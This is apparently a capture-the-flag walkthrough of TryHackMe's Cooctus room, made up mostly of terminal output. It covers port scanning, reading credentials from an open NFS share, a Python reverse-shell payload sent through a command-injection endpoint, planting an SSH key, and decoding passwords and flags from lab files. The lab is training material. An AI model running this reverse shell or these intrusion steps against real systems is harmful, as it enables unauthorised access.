----
This room is about the Cooctus Clan
----

![](https://pbs.twimg.com/profile_banners/1696074763/1605441583/1500x500)

![222](https://tryhackme-images.s3.amazonaws.com/room-icons/ceced121b72bb2fdd04bfc59fcbc2dce.png)

### Task 1  The story so far...

 Start Machine

**Previously on Cooctus Tracker**  
_Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened. (From [Overpass 2 - Hacked](https://tryhackme.com/room/overpass2hacked) by [NinjaJc01](https://tryhackme.com/p/NinjaJc01))_

**Present times**  
Further investigation revealed that the hack was made possible by the help of an insider threat. Paradox helped the Cooctus Clan hack overpass in exchange for the secret shiba stash. Now, we have discovered a private server deep down under the boiling hot sands of the Saharan Desert. We suspect it is operated by the Clan and it's your objective to uncover their plans.

**Note:** A stable shell is recommended, so try and SSH into users when possible.

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.205.66 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.205.66:22
Open 10.10.205.66:111
Open 10.10.205.66:2049
Open 10.10.205.66:8080
Open 10.10.205.66:35963
Open 10.10.205.66:37837
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-16 13:38 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:38
Completed NSE at 13:38, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:38
Completed Parallel DNS resolution of 1 host. at 13:38, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:38
Scanning 10.10.205.66 [6 ports]
Discovered open port 8080/tcp on 10.10.205.66
Discovered open port 111/tcp on 10.10.205.66
Discovered open port 22/tcp on 10.10.205.66
Discovered open port 37837/tcp on 10.10.205.66
Discovered open port 2049/tcp on 10.10.205.66
Discovered open port 35963/tcp on 10.10.205.66
Completed Connect Scan at 13:38, 0.18s elapsed (6 total ports)
Initiating Service scan at 13:38
Scanning 6 services on 10.10.205.66
Completed Service scan at 13:39, 8.43s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.205.66.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:39
Completed NSE at 13:39, 7.06s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:39
Completed NSE at 13:39, 0.94s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:39
Completed NSE at 13:39, 0.00s elapsed
Nmap scan report for 10.10.205.66
Host is up, received user-set (0.18s latency).
Scanned at 2023-07-16 13:38:54 EDT for 16s

PORT      STATE SERVICE  REASON  VERSION
22/tcp    open  ssh      syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e54462919008995de8554f69ca021c10 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbRN8GvRSpA+ku5hqrPnyaobOvwYc4jddRGBHo91dNlIjNdX4LIRLCLdJkpMlW64MVwHV8QIjTFNxPqLQvOkbIn3yX+MQByFziSNf7h5+/tqrXDwZDMMqFAmZ7yeXoopcRY1cfumkYUHbjRxdrNj8Hpd8ol6xnIo9y+qiZx1HPpY3P9HsRpZ6XBq0bE3J68gBozFQmXa8gIU5aX+l0PHOdctWRo4vXa/oQteObsn9Rx+69WpatoDx1TdP4T3fGa3f1dMFIohCzlTUPJgzyGuRZq6JjaBvItUIGPg+isvkg7+diSLDCIo/U7vixeJNLrnvETMnRlwn0jOKxUFrtIwB7
|   256 e5a7b01452e1c94e0db81adbc5d67ef0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNz3AD3vWNpd2P1sXPm9tHrr6RQjBiCsXT0U/6euW2oK1RqQvipuiKTlcpNRRsXOxcIpscn+7M3nwW5Cgq0ipiA=
|   256 029718d6cd3258175043ddd22fba1553 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAv5Jlh5/zgLa5D73WCXKa44htAWA67kUp4x5pGWgXri
111/tcp   open  rpcbind  syn-ack 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      33588/udp6  mountd
|   100005  1,2,3      46596/udp   mountd
|   100005  1,2,3      50235/tcp   mountd
|   100005  1,2,3      60881/tcp6  mountd
|   100021  1,3,4      34461/udp6  nlockmgr
|   100021  1,3,4      35963/tcp   nlockmgr
|   100021  1,3,4      37256/udp   nlockmgr
|   100021  1,3,4      44709/tcp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  syn-ack 3 (RPC #100227)
8080/tcp  open  http     syn-ack Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-title: CCHQ
|_http-server-header: Werkzeug/0.14.1 Python/3.6.9
35963/tcp open  nlockmgr syn-ack 1-4 (RPC #100021)
37837/tcp open  mountd   syn-ack 1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:39
Completed NSE at 13:39, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:39
Completed NSE at 13:39, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:39
Completed NSE at 13:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.09 seconds

                                                                                   
┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.205.66:8080/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.205.66:8080/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/07/16 13:42:51 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.205.66:8080/cat                  (Status: 302) [Size: 219] [--> http://10.10.205.66:8080/login]
http://10.10.205.66:8080/login                (Status: 200) [Size: 556]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/07/16 13:45:00 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ showmount -e 10.10.205.66 
Export list for 10.10.205.66:
/var/nfs/general *
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ sudo mkdir /mnt/cat-nfs 
[sudo] password for witty: 
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ sudo mount 10.10.205.66:/var/nfs/general /mnt/cat-nfs 

┌──(witty㉿kali)-[~/Downloads]
└─$ cd /mnt/cat-nfs         
                                                                                  
┌──(witty㉿kali)-[/mnt/cat-nfs]
└─$ ls
credentials.bak
                                                                                  
┌──(witty㉿kali)-[/mnt/cat-nfs]
└─$ cat credentials.bak                 
paradoxial.test
ShibaPretzel79

login in port 8080

- `-c`: This option tells `rlwrap` to clear the screen after each command is executed. It helps keep the terminal clean and provides a fresh view for each new command.
    
- `-A`: It enables automatic line-wrapping. This means that when you reach the end of a line and continue typing, the text will automatically wrap to the next line instead of creating a horizontal scrollbar.
    
- `-r`: This option enables recursive history search. It allows you to search through your command history using Ctrl+R, allowing you to quickly find and reuse previous commands.

http://10.10.205.66:8080/cat

Welcome Cooctus Recruit!

Here, you can test your exploits in a safe environment before launching them against your target. Please bear in mind, some functionality is still under development in the current version.

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

┌──(witty㉿kali)-[/mnt/cat-nfs]
└─$ rlwrap -cAr nc -lvnp 4444                                
listening on [any] 4444 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.205.66] 60968
paradox@cchq:~$ python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
</bash')" || /usr/bin/script -qc /bin/bash /dev/null
paradox@cchq:~$ ls
ls
CATapp  user.txt
paradox@cchq:~$ cat user.txt
cat user.txt
THM{2dccd1ab3e03990aea77359831c85ca2}

paradox@cchq:~/CATapp$ cat app.py
cat app.py
#!/usr/bin/python3

from flask import Flask, render_template, redirect, url_for, request
import os
import shlex
import subprocess

app = Flask(__name__)

global logged_in
logged_in = False

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/login", methods=['GET', 'POST'])
def login():
    global logged_in
    error = None
    if request.method == "POST":
        if request.form['username'] != 'paradoxial.test' or request.form['password'] != 'ShibaPretzel79':
            error = 'No enter for you >:('
        else:
            logged_in = True
            return redirect(url_for('cat'))
    
    return render_template("login.html", error = error)

@app.route("/cat", methods=['GET', 'POST'])
def cat():
    global logged_in
    if not logged_in:
        return redirect(url_for("login"))
    error = None
    if request.method == "POST":
        payload = request.form['payload']
        os.system(payload)
        #return request.form['payload']
        return payload
    return render_template("cat.html", error=error)

if __name__ == '__main__':
	app.run(host="0.0.0.0", port=8080)

paradox@cchq:~$ mkdir .ssh
mkdir .ssh
paradox@cchq:~$ cd .ssh
cd .ssh
paradox@cchq:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vZarFqiXyoMZ/+B9S5jcOMRIOwWMyTvWUIWwsTc2WlDBgRPRA4dnEtvHzN+WLEE0mLsatYqipe5ULuZ6EbKE1vD5lx5BO+zrEQafs5JcJ5Th0noVivP9BS3E5EuccqMOPUBKZ6YQA9Yc5jLMz2MzaRpUQSy7QojdLziXU1s0cl6TbVQbNypj4JJcmz76TxhN/gR+FXUR+YTdtb08/IJx3eOq5b0lZthBbeDXszcQKl4fwP1/MBvmmEgD2ByvdUk+kckOJsi2IEiJjm7AIFK8s2/MW2cl/t1+qDS+c/HMEQf4lum4sMEcMP7WKZ9XLHL4DPsrwCrUsK/qntuP+lvormUn9otLc0yirRpawpdBocxOpxNZKp7FL3xr47yN3A406CaLXgMYSqP2WQrumH0VsfRMp+oSxYCRC9HzFoRto7qXw3rWozLgq0RicWzdOhD59Ooc4ZA5Kro46ftMD8oCOzUDzK/lKmhnHN3Kuiz6bklOMx4qtfu28PozrFPq348= witty@kali" > authorized_keys 
<Mx4qtfu28PozrFPq348= witty@kali" > authorized_keys 


┌──(witty㉿kali)-[~/Downloads]
└─$ cd seasurfer  
                                                                                   
┌──(witty㉿kali)-[~/Downloads/seasurfer]
└─$ ls
id_rsa  id_rsa.pub
                                                                                   
┌──(witty㉿kali)-[~/Downloads/seasurfer]
└─$ ssh -i id_rsa paradox@10.10.205.66
The authenticity of host '10.10.205.66 (10.10.205.66)' can't be established.
ED25519 key fingerprint is SHA256:dNmGI1/f4OIRxWe6Ni/JzXxVz7QOMEGVvRTBj7LNbyQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.205.66' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jul 16 19:39:35 UTC 2023

  System load:  0.0                Processes:           111
  Usage of /:   35.0% of 18.57GB   Users logged in:     0
  Memory usage: 37%                IP address for eth0: 10.10.205.66
  Swap usage:   0%


0 packages can be updated.
0 of these updates are security updates.


Last login: Sat Feb 20 21:17:46 2021 from 172.16.228.162
paradox@cchq:~$ id
uid=1003(paradox) gid=1003(paradox) groups=1003(paradox)

Broadcast message from szymex@cchq (somewhere) (Sun Jul 16 19:40:01 2023):     
                                                                               
Approximate location of an upcoming Dr.Pepper shipment found:
                                                                               
                                                                               
Broadcast message from szymex@cchq (somewhere) (Sun Jul 16 19:40:01 2023):     
                                                                               
Coordinates: X: 507, Y: 115, Z: 841

paradox@cchq:/home/szymex$ cat note_to_para 
Paradox,

I'm testing my new Dr. Pepper Tracker script. 
It detects the location of shipments in real time and sends the coordinates to your account.
If you find this annoying you need to change my super secret password file to disable the tracker.

You know me, so you know how to get access to the file.

- Szymex
paradox@cchq:/home/szymex$ cat SniffingCat.py 
#!/usr/bin/python3
import os
import random

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc


x = random.randint(300,700)
y = random.randint(0,255)
z = random.randint(0,1000)

message = "Approximate location of an upcoming Dr.Pepper shipment found:"
coords = "Coordinates: X: {x}, Y: {y}, Z: {z}".format(x=x, y=y, z=z)

with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
    line = f.readline().rstrip("\n")
    enc_pw = encode(line)
    if enc_pw == "pureelpbxr":
        os.system("wall -g paradox " + message)
        os.system("wall -g paradox " + coords)

paradox@cchq:/home/szymex$ cat mysupersecretpassword.cat
cat: mysupersecretpassword.cat: Permission denied
paradox@cchq:/home/szymex$ ls -lah
total 44K
drwxr-xr-x 5 szymex szymex 4.0K Feb 22  2021 .
drwxr-xr-x 6 root   root   4.0K Jan  2  2021 ..
lrwxrwxrwx 1 szymex szymex    9 Feb 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 szymex szymex  220 Jan  2  2021 .bash_logout
-rw-r--r-- 1 szymex szymex 3.8K Feb 20  2021 .bashrc
drwx------ 2 szymex szymex 4.0K Jan  2  2021 .cache
drwx------ 3 szymex szymex 4.0K Jan  2  2021 .gnupg
drwxrwxr-x 3 szymex szymex 4.0K Jan  2  2021 .local
-r-------- 1 szymex szymex   11 Jan  2  2021 mysupersecretpassword.cat
-rw-rw-r-- 1 szymex szymex  316 Feb 20  2021 note_to_para
-rwxrwxr-- 1 szymex szymex  735 Feb 20  2021 SniffingCat.py
-rw------- 1 szymex szymex   38 Feb 22  2021 user.txt

paradox@cchq:/home/szymex$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* * 	* * * 	szymex	/home/szymex/SniffingCat.py

paradox@cchq:/home/szymex$ python SniffingCat.py 
Traceback (most recent call last):
  File "SniffingCat.py", line 23, in <module>
    with open('/home/szymex/mysupersecretpassword.cat', 'r') as f:
IOError: [Errno 13] Permission denied: '/home/szymex/mysupersecretpassword.cat'

┌──(witty㉿kali)-[~/Downloads]
└─$ cat test_cat.py 
#!/usr/bin/python3

def encode(pwd):
    enc = ''
    for i in pwd:
        if ord(i) > 110:
            num = (13 - (122 - ord(i))) + 96
            enc += chr(num)
        else:
            enc += chr(ord(i) + 13)
    return enc

s = 'abcdefghijklmnopqrstuvwxyz'
clear = list(s)
encoded = list(encode(s))

pwd = "pureelpbxr"
dec = ""

for i in pwd:
    dec += clear[encoded.index(i)]

print(dec)
                                                                                  
┌──(witty㉿kali)-[~/Downloads]
└─$ python3 test_cat.py 
cherrycoke

paradox@cchq:/home/szymex$ su szymex
Password: 
szymex@cchq:~$ cd /home/szymex/
szymex@cchq:~$ ls
mysupersecretpassword.cat  note_to_para  SniffingCat.py  user.txt
szymex@cchq:~$ cat user.txt 
THM{c89f9f4ef264e22001f9a9c3d72992ef}

szymex@cchq:/home$ cd tux/
szymex@cchq:/home/tux$ ls
note_to_every_cooctus  tuxling_1  user.txt
szymex@cchq:/home/tux$ cat note_to_every_cooctus 
Hello fellow Cooctus Clan members

I'm proposing my idea to dedicate a portion of the cooctus fund for the construction of a penguin army.

The 1st Tuxling Infantry will provide young and brave penguins with opportunities to
explore the world while making sure our control over every continent spreads accordingly.

Potential candidates will be chosen from a select few who successfully complete all 3 Tuxling Trials.
Work on the challenges is already underway thanks to the trio of my top-most explorers.

Required budget: 2,348,123 Doge coins and 47 pennies.

Hope this message finds all of you well and spiky.

- TuxTheXplorer

szymex@cchq:/home/tux$ cd tuxling_1
szymex@cchq:/home/tux/tuxling_1$ ls
nootcode.c  note
szymex@cchq:/home/tux/tuxling_1$ cat note
Noot noot! You found me. 
I'm Mr. Skipper and this is my challenge for you.

General Tux has bestowed the first fragment of his secret key to me.
If you crack my NootCode you get a point on the Tuxling leaderboards and you'll find my key fragment.

Good luck and keep on nooting!

PS: You can compile the source code with gcc
szymex@cchq:/home/tux/tuxling_1$ cat nootcode.c
#include <stdio.h>

#define noot int
#define Noot main
#define nOot return
#define noOt (
#define nooT )
#define NOOOT "f96"
#define NooT ;
#define Nooot nuut
#define NOot {
#define nooot key
#define NoOt }
#define NOOt void
#define NOOT "NOOT!\n"
#define nooOT "050a"
#define noOT printf
#define nOOT 0
#define nOoOoT "What does the penguin say?\n"
#define nout "d61"

noot Noot noOt nooT NOot
    noOT noOt nOoOoT nooT NooT
    Nooot noOt nooT NooT

    nOot nOOT NooT
NoOt

NOOt nooot noOt nooT NOot
    noOT noOt NOOOT nooOT nout nooT NooT
NoOt

NOOt Nooot noOt nooT NOot
    noOT noOt NOOT nooT NooT
NoOt

szymex@cchq:/home/tux/tuxling_1$ cat nootcode.c  | sed 's/noot/int/g'
#include <stdio.h>

#define int int

cat nootcode.c  | sed 's/noot/int/g'  | sed 's/Noot/main/g' | sed 's/nOot/return/g'  | sed 's/noOt/(/g' | sed 's/nooT/)/g' | sed 's/NOOOT/"f96"/g'  | sed 's/NooT/;/g' | sed 's/Nooot/nuut/g'  | sed 's/NOot/{/g' | sed 's/nooot/key/g'  | sed 's/NoOt/}/g'  | sed 's/NOOt/void/g' | sed 's/NOOT/"NOOT!\n"/g'  | sed 's/nooOT/"050a"/g'  | sed 's/noOT/printf/g'  | sed 's/nOOT/0/g'  | sed 's/nOoOoT/"What does the penguin say?\n"/g'  | sed 's/nout/"d61"/g'

#include <stdio.h>oOoT/"What does the penguin say?\n"/g'  | sed 's/nout/"d61"/g' 

#define int int
#define main main
#define return return
#define ( (
#define ) )
#define "f96" "f96"
#define ; ;
#define nuut nuut
#define { {
#define key key
#define } }
#define void void
#define "NOOT!
" ""NOOT!
"!\n"
#define "050a" "050a"
#define printf printf
#define 0 0
#define "What does the penguin say?
" "What does the penguin say?\n"
#define "d61" "d61"

int main ( ) {
    printf ( "What does the penguin say?
" ) ;
    nuut ( ) ;

    return 0 ;
}

void key ( ) {
    printf ( "f96" "050a" "d61" ) ;
}

void nuut ( ) {
    printf ( "NOOT!
" ) ;
}

f96050ad61

szymex@cchq:/home/tux$ ls -lah
total 52K
drwxr-xr-x 9 tux  tux     4.0K Feb 20  2021 .
drwxr-xr-x 6 root root    4.0K Jan  2  2021 ..
lrwxrwxrwx 1 tux  tux        9 Feb 20  2021 .bash_history -> /dev/null
-rw-r--r-- 1 tux  tux      220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 tux  tux     3.7K Feb 20  2021 .bashrc
drwx------ 3 tux  tux     4.0K Nov 21  2020 .cache
drwx------ 4 tux  tux     4.0K Feb 20  2021 .config
drwx------ 5 tux  tux     4.0K Feb 20  2021 .gnupg
-rw------- 1 tux  tux       58 Feb 20  2021 .lesshst
drwx------ 5 tux  tux     4.0K Jan  2  2021 .local
-rw-rw-r-- 1 tux  tux      630 Jan  2  2021 note_to_every_cooctus
drwx------ 2 tux  tux     4.0K Feb 20  2021 .ssh
-rw-r--r-- 1 tux  tux        0 Feb 20  2021 .sudo_as_admin_successful
drwxrwx--- 2 tux  testers 4.0K Feb 20  2021 tuxling_1
-rw------- 1 tux  tux       38 Feb 20  2021 user.txt

szymex@cchq:/home/tux$ find / -type d -name "tuxling*" 2>/dev/null
/home/tux/tuxling_3
/home/tux/tuxling_1
/media/tuxling_2

Based on the output you provided, it appears that the "tuxling_3" directory has the execute permission (`x`) set only for the owner (`tux`) and the group (`testers`). It does not have the execute permission set for other users.

When listing a directory, the execute permission is crucial for accessing its contents. Without the execute permission on a directory, you cannot enter or access the files within it.

In this case, since you are not the owner of the "tuxling_3" directory, and you are not a member of the `testers` group, you do not have the execute permission on the directory. As a result, you cannot access or see the contents of the "tuxling_3" directory, including the file named "note".

szymex@cchq:/home/tux/tuxling_3$ cd /media/tuxling_2
szymex@cchq:/media/tuxling_2$ ls
fragment.asc  note  private.key
szymex@cchq:/media/tuxling_2$ cat note
Noot noot! You found me. 
I'm Rico and this is my challenge for you.

General Tux handed me a fragment of his secret key for safekeeping.
I've encrypted it with Penguin Grade Protection (PGP).

You can have the key fragment if you can decrypt it.

Good luck and keep on nooting!

szymex@cchq:/media/tuxling_2$ cat fragment.asc
-----BEGIN PGP MESSAGE-----

hQGMA5fUjrF1Eab6AQv/Vcs2Y6xyn5aXZfSCjCwKT1wxBgOcx2MBeat0wtAsYzkF
J6nWV3nBUyA2tXUBAHsr5iZnsuXubsG6d5th7z5UO8+1MS424I3Rgy/969qyfshj
iouZtXyaerR1/Sok3b1wk3iyPCn2cXc2HPP57bDqm15LEwO28830wun8twT6jX/+
Nr4tDW767gfADB/nJOFkAr+4rqHGY8J/bFnLHTZV2oVIYbFy0VarzcKBFQVQLx0G
OqF1A1nPHNCCENcHEzGbzogQoQbQK+8jefH8Epfs25zpsTTg/+z5XOnJQXD5UXg2
x9c0ABS9T8K3V6ZhyXPAxfSFpxUyVJBKhnugOd/QP4Kqzu30H1mWNxvE1jJQpcxs
uBJIzEtHn/efXQdsLM8swQ6RrnTAKRpK7Ew307itPSvaejCw87FCTaMzwXj2RNkD
8n6P/kZbTHrVdBS7KxGDJ/SsTpQgz8QpQyQIK/oDxNEP4ZsgosBJ4QnjVW8vNLZF
P72PMvolHYd461j62+uv0mQBTQhH5STUWq6OtHlHgbrnSJvGNll3WZ5BfCiE2O1C
8+UXEfCw05QMZgE2dePneZdWISNUkGTTVji9atq3l4b0vbHihNdwTTMfla8+arPs
eA0RkdEXuoYWvOpocvlU5XuTcCdy
=GDIs
-----END PGP MESSAGE-----

szymex@cchq:/media/tuxling_2$ gpg --import private.key
gpg: key B70EB31F8EF3187C: public key "TuxPingu" imported
gpg: key B70EB31F8EF3187C: secret key imported
gpg: Total number processed: 1
gpg:               imported: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
                                                                               
Broadcast message from szymex@cchq (somewhere) (Sun Jul 16 20:11:01 2023):     
                                                                               
Approximate location of an upcoming Dr.Pepper shipment found:
                                                                               
                                                                               
Broadcast message from szymex@cchq (somewhere) (Sun Jul 16 20:11:01 2023):     
                                                                               
Coordinates: X: 594, Y: 171, Z: 542
                                                                               

szymex@cchq:/media/tuxling_2$ gpg --decrypt fragment.asc
gpg: Note: secret key 97D48EB17511A6FA expired at Mon 20 Feb 2023 07:58:30 PM UTC
gpg: encrypted with 3072-bit RSA key, ID 97D48EB17511A6FA, created 2021-02-20
      "TuxPingu"
The second key fragment is: 6eaf62818d



szymex@cchq:/home/tux/tuxling_1$ cd /home/tux/tuxling_3
szymex@cchq:/home/tux/tuxling_3$ ls
note
szymex@cchq:/home/tux/tuxling_3$ cat note
Hi! Kowalski here. 
I was practicing my act of disappearance so good job finding me.

Here take this,
The last fragment is: 637b56db1552

Combine them all and visit the station.


f96050ad616eaf62818d637b56db1552

tuxykitty

szymex@cchq:/media/tuxling_2$ su tux
Password: 
tux@cchq:/media/tuxling_2$ cd /home/tux/
tux@cchq:~$ ls
note_to_every_cooctus  tuxling_1  tuxling_3  user.txt
tux@cchq:~$ cat user.txt 
THM{592d07d6c2b7b3b3e7dc36ea2edbd6f1}

tux@cchq:/home/varg$ ls -lah
total 48K
drwxr-xr-x  7 varg varg      4.0K Feb 20  2021 .
drwxr-xr-x  6 root root      4.0K Jan  2  2021 ..
lrwxrwxrwx  1 varg varg         9 Feb 20  2021 .bash_history -> /dev/null
-rw-r--r--  1 varg varg       220 Jan  2  2021 .bash_logout
-rw-r--r--  1 varg varg      3.7K Jan  3  2021 .bashrc
drwx------  2 varg varg      4.0K Jan  3  2021 .cache
-rwsrws--x  1 varg varg      2.1K Feb 20  2021 CooctOS.py
drwxrwx--- 11 varg os_tester 4.0K Feb 20  2021 cooctOS_src
-rw-rw-r--  1 varg varg        47 Feb 20  2021 .gitconfig
drwx------  3 varg varg      4.0K Jan  3  2021 .gnupg
drwxrwxr-x  3 varg varg      4.0K Jan  3  2021 .local
drwx------  2 varg varg      4.0K Feb 20  2021 .ssh
-rw-------  1 varg varg        38 Feb 20  2021 user.txt

tux@cchq:~$ cd /home/varg/cooctOS_src/
tux@cchq:/home/varg/cooctOS_src$ ls -lah
total 44K
drwxrwx--- 11 varg os_tester 4.0K Feb 20  2021 .
drwxr-xr-x  7 varg varg      4.0K Feb 20  2021 ..
drwxrwx---  2 varg os_tester 4.0K Feb 20  2021 bin
drwxrwx---  4 varg os_tester 4.0K Feb 20  2021 boot
drwxrwx---  2 varg os_tester 4.0K Feb 20  2021 etc
drwxrwx---  2 varg os_tester 4.0K Feb 20  2021 games
drwxrwxr-x  8 varg os_tester 4.0K Feb 20  2021 .git
drwxrwx---  3 varg os_tester 4.0K Feb 20  2021 lib
drwxrwx--- 16 varg os_tester 4.0K Feb 20  2021 run
drwxrwx---  2 varg os_tester 4.0K Feb 20  2021 tmp
drwxrwx--- 11 varg os_tester 4.0K Feb 20  2021 var

tux@cchq:/home/varg/cooctOS_src$ git show
commit 8b8daa41120535c569d0b99c6859a1699227d086 (HEAD -> master)
Author: Vargles <varg@cchq.noot>
Date:   Sat Feb 20 15:47:21 2021 +0000

    Removed CooctOS login script for now

diff --git a/bin/CooctOS.py b/bin/CooctOS.py
deleted file mode 100755
index 4ccfcc1..0000000
--- a/bin/CooctOS.py
+++ /dev/null
@@ -1,52 +0,0 @@
-#!/usr/bin/python3
-
-import time
-import os;
-import pty;
-
-#print(chr(27)+ "[2J")
-logo = """\033[1;30;49m
- ██████╗ ██████╗  ██████╗  ██████╗████████╗ \033[1;37;49m██████╗ ███████╗\033[1;30;49m
;30;49m
-██║     ██║   ██║██║   ██║██║        ██║   \033[1;37;49m██║   ██║███████╗\033[1;30;49m
-██║     ██║   ██║██║   ██║██║        ██║   \033[1;37;49m██║   ██║╚════██║\033[1;30;49m
-╚██████╗╚██████╔╝╚██████╔╝╚██████╗   ██║   \033[1;37;49m╚██████╔╝███████║\033[1;30;49m
- ╚═════╝ ╚═════╝  ╚═════╝  ╚═════╝   ╚═╝    \033[1;37;49m╚═════╝ ╚══════╝\033[1;30;49m
-"""
-print(logo)
-print("                       LOADING")
-print("[", end='')
-
-for i in range(0,60):
-    #print(chr(27)+ "[2J")
-    #print(logo)
-    #print("                       LOADING")
-    print("[", end='')
-    print("=" * i, end='')
-    print("]")
-    time.sleep(0.02)
-    print("\033[A\033[A")
-
-print("\032")
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Cold boot detected. Flux Capacitor powered up")
-
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Mounted Cooctus Filesystem under /opt")
-
-print("\033[0;0m[ \033[92m OK  \033[0;0m] Finished booting sequence")
-
-print("CooctOS 13.3.7 LTS cookie tty1")
-uname = input("\ncookie login: ")
-pw = input("Password: ")
-
-for i in range(0,2):
-    if pw != "slowroastpork":
-        pw = input("Password: ")
-    else:
-        if uname == "varg":
-            os.setuid(1002)
